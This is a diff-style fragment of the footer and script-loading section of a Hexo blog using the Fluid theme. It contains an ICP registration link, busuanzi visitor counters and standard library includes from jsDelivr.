+<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">苏ICP备2021015436号-1</a>
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
